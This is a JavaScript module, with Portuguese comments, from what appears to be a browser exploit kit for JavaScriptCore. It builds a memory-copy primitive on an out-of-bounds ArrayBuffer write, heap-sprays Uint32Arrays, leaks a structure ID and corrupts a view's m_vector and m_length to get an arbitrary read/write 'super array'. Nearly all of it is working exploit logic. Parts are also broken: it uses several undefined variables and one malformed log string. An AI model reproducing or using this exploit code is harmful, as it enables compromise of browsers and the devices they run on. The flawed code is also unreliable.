// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// ============================================================
// DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
// ============================================================
const FNAME_MAIN = "ExploitLogic_v10.12";

const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_12";
const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
const CORRUPTION_OFFSET_TRIGGER = 0x70; // Usado pela primitiva de cópia E pela corrupção de m_length
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180; // Onde o QWORD lido (JSCell) pela primitiva de cópia será armazenado

let getter_copy_called_flag_v10_12 = false;

// !!!!! O OBJETIVO DESTE SCRIPT É DESCOBRIR ESTE VALOR !!!!!
let EXPECTED_UINT32ARRAY_STRUCTURE_ID = null;
const PLACEHOLDER_SID_UINT32ARRAY = 0xBADBAD00 | 40; // Novo placeholder

// Offset dentro do oob_array_buffer_real onde esperamos que os *metadados* de uma view pulverizada caiam
// e onde aplicaremos a corrupção de m_vector/m_length.
const TARGET_VIEW_METADATA_OFFSET_IN_OOB = 0x58;

// ============================================================
// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
// ============================================================
async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
    getter_copy_called_flag_v10_12 = false;

    if (!oob_array_buffer_real || !oob_dataview_real) {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
    }
    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); // Limpa destino

    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);

    const getterObjectForCopy = {
        get [GETTER_PROPERTY_NAME_COPY]() {
            getter_copy_called_flag_v10_12 = true;
            try {
                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
                const effective_read_offset = qword_at_0x68.high();
                if (effective_read_offset === dword_source_offset_to_read_from) {
                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
                        const data_read = oob_read_absolute(effective_read_offset, 8);
                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
                    } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); }
                } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); }
            } catch (e_getter) { try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} }
            return "getter_copy_done";
        }
    };
    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
    await PAUSE_S3(5);
    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
    if (!getter_copy_called_flag_v10_12) { return null; }
    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
}

async function getStructureIDFromOOB(offset_of_jscell_in_oob) {
    // ... (Corpo como na v10.11, usando a primitiva de cópia atualizada)
    if (!oob_array_buffer_real || offset_of_jscell_in_oob < 0 || offset_of_jscell_in_oob >= oob_array_buffer_real.byteLength - 8) {
        return null;
    }
    const copied_qword = await readFromOOBOffsetViaCopy(offset_of_jscell_in_oob); // Chama a versão correta
    if (copied_qword &&
        !(copied_qword.low() === 0xBADBAD && copied_qword.high() === 0xDEADDEAD) &&
        !(copied_qword.low() === 0xBAD68BAD && copied_qword.high() === 0xBAD68BAD) ) {
        return copied_qword.low();
    }
    return null;
}


// ============================================================
// FUNÇÃO PRINCIPAL DE INVESTIGAÇÃO (v10.12)
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.discoverSIDAtFixedOffset_v10.12`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Descoberta de SID em Offset Fixo (0x58) Pós-Spray ---`, "test", FNAME_CURRENT_TEST);

    let sprayedU32Arrays = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
        logS3(`   AVISO: Tentando descobrir SID de Uint32Array em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}. Placeholder: ${toHex(PLACEHOLDER_SID_UINT32ARRAY)}`, "warn", FNAME_CURRENT_TEST);

        // --- PASSO 1: Validar rapidamente a primitiva de leitura de SID ---
        // (Mantido da v10.11 para garantir que a primitiva de cópia ainda funciona)
        const known_ab_sid = JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID;
        if (typeof known_ab_sid === 'number') {
            const FAKE_AB_CELL_OFFSET = 0x3F0;
            const fake_ab_jscell_qword = new AdvancedInt64(known_ab_sid, 0x01000100 | (known_ab_sid >> 24) );
            oob_write_absolute(FAKE_AB_CELL_OFFSET, fake_ab_jscell_qword, 8);
            let sid_read_from_fake_ab = await getStructureIDFromOOB(FAKE_AB_CELL_OFFSET); // Usa a primitiva atual
            if (sid_read_from_fake_ab !== null && sid_read_from_fake_ab === fake_ab_jscell_qword.low()) {
                logS3("  PASSO 1: Primitiva de leitura de SID validada.", "good", FNAME_CURRENT_TEST);
            } else {
                logS3(`  PASSO 1: AVISO - Falha ao validar primitiva de SID. Lido: ${toHex(sid_read_from_fake_ab)}, Esperado: ${toHex(fake_ab_jscell_qword.low())}`, "warn", FNAME_CURRENT_TEST);
            }
        } else {
             logS3("  PASSO 1: AVISO - ArrayBuffer_STRUCTURE_ID não definido, pulando validação.", "warn", FNAME_CURRENT_TEST);
        }
        await PAUSE_S3(50);

        // --- PASSO 2: Pulverizar Uint32Arrays e Ler o SID no Offset Fixo Alvo ---
        logS3(`PASSO 2: Pulverizando Uint32Arrays e lendo SID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
        const NUM_U32_SPRAY = 300;
        const U32_SPRAY_LEN_BASE = 4;
        sprayedU32Arrays = [];
        for (let i = 0; i < NUM_U32_SPRAY; i++) {
            // Estes criam seus próprios ArrayBuffers. Esperamos que o *JSCell da view* caia no oob_array_buffer_real.
            sprayedU32Arrays.push(new Uint32Array(U32_SPRAY_LEN_BASE + (i % 8)));
        }
        logS3(`  ${sprayedU32Arrays.length} Uint32Arrays pulverizados.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(500); // Dar mais tempo para a heap assentar

        // Limpar/Preencher o local alvo antes de ler o SID pós-spray para remover lixo antigo
        oob_write_absolute(TARGET_VIEW_METADATA_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); // Zera a área do JSCell

        // Tentar ler o StructureID do offset fixo onde esperamos que um Uint32Array tenha caído
        let sid_at_target_offset = await getStructureIDFromOOB(TARGET_VIEW_METADATA_OFFSET_IN_OOB);

        if (sid_at_target_offset !== null && sid_at_target_offset !== 0 && sid_at_target_offset !== 0xFFFFFFFF &&
            (sid_at_target_offset & 0xFFFF0000) !== 0xCAFE0000 && // Não é padrão de preenchimento antigo
            (typeof known_ab_sid !== 'number' || (sid_at_target_offset & 0xFFFFFF00) !== (known_ab_sid & 0xFFFFFF00)) // Não é AB
        ) {
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = sid_at_target_offset;
            logS3(`  !!!! StructureID POTENCIALMENTE DESCOBERTO em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)} !!!!`, "vuln", FNAME_CURRENT_TEST);
            logS3("    >>>> COPIE ESTE VALOR PARA A CONSTANTE EXPECTED_UINT32ARRAY_STRUCTURE_ID NO TOPO DO ARQUIVO! <<<<", "critical", FNAME_CURRENT_TEST);
            document.title = `U32 SID=${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`;
        } else {
            logS3(`  Nenhum SID de Uint32Array candidato encontrado em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}. Lido: ${toHex(sid_at_target_offset)}`, "warn", FNAME_CURRENT_TEST);
            EXPECTED_UINT32ARRAY_STRUCTURE_ID = PLACEHOLDER_SID_UINT32ARRAY;
        }
        logS3(`EXPECTED_UINT32ARRAY_STRUCTURE_ID (para este run): ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}`, "info", FNAME_CURRENT_TEST);


        // --- PASSO 3: Se um SID foi descoberto, tentar corromper m_vector/m_length e identificar o superArray ---
        if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== PLACEHOLDER_SID_UINT32ARRAY) {
            logS3(`PASSO 3: Tentando corromper metadados do objeto em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} (assumindo que é um Uint32Array)...`, "info", FNAME_CURRENT_TEST);

            const m_vector_addr = TARGET_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
            const m_length_addr = TARGET_VIEW_METADATA_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x58 + 0x18 = 0x70

            // Plantar valores para m_vector (0) e preparar m_length (via 0x6C e 0x70)
            oob_write_absolute(m_vector_addr, PLANT_MVECTOR_LOW_PART, 4);     // m_vector.low em 0x68
            oob_write_absolute(m_vector_addr + 4, PLANT_MVECTOR_HIGH_PART, 4); // m_vector.high em 0x6C
            // A corrupção principal em 0x70 definirá m_length e m_mode
            logS3(`  Valores plantados para m_vector em ${toHex(m_vector_addr)}: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)}`, "info", FNAME_CURRENT_TEST);

            logS3(`  Acionando corrupção em ${toHex(CORRUPTION_OFFSET_TRIGGER)} (0x70)...`, "info", FNAME_CURRENT_TEST);
            oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
            await PAUSE_S3(50);

            // Verificar metadados corrompidos
            const corrupted_sid = await getStructureIDFromOOB(TARGET_VIEW_METADATA_OFFSET_IN_OOB); // Lê o SID da área de cópia
            const corrupted_m_vector = await readFromOOBOffsetViaCopy(m_vector_addr); // Lê m_vector da área de cópia
            const corrupted_m_length_qword = await readFromOOBOffsetViaCopy(m_length_addr); // Lê o QWORD onde m_length está
            const corrupted_m_length = corrupted_m_length_qword ? corrupted_m_length_qword.low() : null;

            logS3(`    Metadados em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} APÓS CORRUPÇÃO:`, "info", FNAME_CURRENT_TEST);
            logS3(`      StructureID: ${toHex(corrupted_sid)} (Esperado: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)})`, "leak", FNAME_CURRENT_TEST);
            logS3(`      m_vector:    ${corrupted_m_vector ? corrupted_m_vector.toString(true) : "N/A"} (Esperado: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "leak", FNAME_CURRENT_TEST);
            logS3(`      m_length:    ${toHex(corrupted_mlen)} (Esperado: 0xffffffff)`, "leak", FNAME_CURRENT_TEST);

            if (corrupted_sid === EXPECTED_UINT32ARRAY_STRUCTURE_ID &&
                corrupted_m_vector && corrupted_m_vector.low() === PLANT_MVECTOR_LOW_PART && corrupted_m_vector.high() === PLANT_MVECTOR_HIGH_PART &&
                corrupted_mlen === 0xFFFFFFFF) {
                logS3("      !!!! SUCESSO !!!! Uint32Array REAL em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} parece corrompido como esperado!", "vuln", FNAME_CURRENT_TEST);
                document.title = `U32Array @${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} OK!`;

                // Tentar identificar o superArray
                const MARKER_VAL = 0xFEEDFACE;
                const MARKER_IDX = 1; 
                const MARKER_OOB_OFFSET = MARKER_IDX * 4;
                let orig_val = oob_read_absolute(MARKER_OOB_OFFSET, 4);
                oob_write_absolute(MARKER_OOB_OFFSET, MARKER_VAL, 4);

                for (let i = 0; i < sprayedVictimViews.length; i++) {
                    try {
                        if (sprayedVictimViews[i][MARKER_IDX] === MARKER_VAL) {
                            superArray = sprayedVictimViews[i];
                            superArrayIndex = i;
                            logS3(`        !!!!!! SUPER ARRAY (VIEW) ENCONTRADO em sprayedVictimViews[${i}] (marcador inicial: ${toHex(superArray[0])}) !!!!!!`, "vuln", FNAME_CURRENT_TEST);
                            document.title = `SUPER_ARRAY[${i}] USÁVEL!`;
                            break;
                        }
                    } catch (e) {}
                }
                oob_write_absolute(MARKER_OOB_OFFSET, orig_val, 4); // Restaurar
                 if (superArray) {
                    logS3(`    SUPER ARRAY JS: sprayedVictimViews[${superArrayIndex}]`, "good", FNAME_CURRENT_TEST);
                    // Teste adicional com superArray
                    const test_val = superArray[0]; // Lê o marcador original que colocamos na view
                    logS3(`    Teste de leitura do superArray[0]: ${toHex(test_val)} (Esperado ~0xFACE00XX)`, "leak", FNAME_CURRENT_TEST);
                } else {
                    logS3("    Não foi possível identificar o superArray via teste de marcador.", "warn", FNAME_CURRENT_TEST);
                }


            } else {
                 logS3("      Falha ao corromper metadados do Uint32Array real como esperado.", "error", FNAME_CURRENT_TEST);
            }
        }


    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MAIN} FALHOU!`;
    } finally {
        sprayedU32Arrays = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
    }
}
